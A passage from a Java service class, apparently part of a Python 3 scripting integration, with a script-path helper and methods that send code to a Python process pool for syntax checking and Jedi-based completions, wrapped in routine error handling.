     * @return Full path string
     */
    private String buildScriptPath(Python3ScriptRepository.ScriptMetadata script) {
        String folder = script.getFolderPath();
        if (folder == null || folder.isEmpty()) {
            return script.getName();
        }
        return folder + "/" + script.getName();
    }

    /**
     * Check Python code for syntax errors.
     * Uses AST parser and pyflakes for validation.
     *
     * @param code Python code to check
     * @return Dictionary with "errors" list containing error details
     */
    public Map<String, Object> checkSyntax(String code) {
        logger.debug("checkSyntax() called with code length: {}", code != null ? code.length() : 0);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized";
                logger.error(errorMsg);
                Map<String, Object> result = new HashMap<>();
                result.put("errors", Collections.emptyList());
                result.put("error", errorMsg);
                return result;
            }

            // Execute syntax check via pool
            Python3Result result = pool.checkSyntax(code != null ? code : "");

            if (result.isSuccess()) {
                Object resultObj = result.getResult();

                // Result should be a Map with "errors" list
                if (resultObj instanceof Map) {
                    // Safe cast: Python bridge returns Map<String, Object> from JSON parsing
                    @SuppressWarnings("unchecked")
                    Map<String, Object> resultMap = (Map<String, Object>) resultObj;
                    logger.debug("Syntax check completed, found {} errors",
                            resultMap.containsKey("errors") && resultMap.get("errors") instanceof List
                                    ? ((List<?>) resultMap.get("errors")).size() : 0);
                    return resultMap;
                } else {
                    // Unexpected result format
                    Map<String, Object> fallback = new HashMap<>();
                    fallback.put("errors", Collections.emptyList());
                    logger.warn("Syntax check returned unexpected format: {}", resultObj);
                    return fallback;
                }
            } else {
                // Syntax check itself failed
                String errorMsg = "Syntax check failed: " + result.getError();
                logger.error(errorMsg);
                Map<String, Object> errorResult = new HashMap<>();
                errorResult.put("errors", Collections.emptyList());
                errorResult.put("error", errorMsg);
                return errorResult;
            }

        } catch (Exception e) {
            logger.error("Failed to check syntax", e);
            Map<String, Object> errorResult = new HashMap<>();
            errorResult.put("errors", Collections.emptyList());
            errorResult.put("error", e.getMessage());
            return errorResult;
        }
    }

    /**
     * Get code completions at cursor position.
     * Uses Jedi library for intelligent code completion.
     *
     * @param code   Python code
     * @param line   Line number (1-based)
     * @param column Column number (0-based)
     * @return Dictionary with "completions" list containing completion details
     */
    public Map<String, Object> getCompletions(String code, int line, int column) {
        logger.debug("getCompletions() called at line {}, column {}", line, column);

        try {
            Python3ProcessPool pool = getProcessPool();
            if (pool == null) {
                String errorMsg = "Python 3 process pool is not initialized";
                logger.error(errorMsg);
                Map<String, Object> result = new HashMap<>();
                result.put("completions", Collections.emptyList());
                result.put("error", errorMsg);
                return result;
            }

            // Execute completions request via pool
            Python3Result result = pool.getCompletions(code != null ? code : "", line, column);

            if (result.isSuccess()) {
                Object resultObj = result.getResult();

                // Result should be a Map with "completions" list
                if (resultObj instanceof Map) {
                    // Safe cast: Python bridge returns Map<String, Object> from JSON parsing
                    @SuppressWarnings("unchecked")
                    Map<String, Object> resultMap = (Map<String, Object>) resultObj;
                    logger.debug("Completions request completed, found {} completions",
                            resultMap.containsKey("completions") && resultMap.get("completions") instanceof List
                                    ? ((List<?>) resultMap.get("completions")).size() : 0);
                    return resultMap;
                } else {
                    // Unexpected result format
                    Map<String, Object> fallback = new HashMap<>();
                    fallback.put("completions", Collections.emptyList());
                    logger.warn("Completions request returned unexpected format: {}", resultObj);
                    return fallback;
                }
            } else {
                // Completions request itself failed
                String errorMsg = "Completions request failed: " + result.getError();
                logger.error(errorMsg);
                Map<String, Object> errorResult = new HashMap<>();
                errorResult.put("completions", Collections.emptyList());
                errorResult.put("error", errorMsg);
                return errorResult;
            }

        } catch (Exception e) {
            logger.error("Failed to get completions", e);
            Map<String, Object> errorResult = new HashMap<>();
            errorResult.put("completions", Collections.emptyList());
            errorResult.put("error", e.getMessage());
            return errorResult;
        }
    }
}
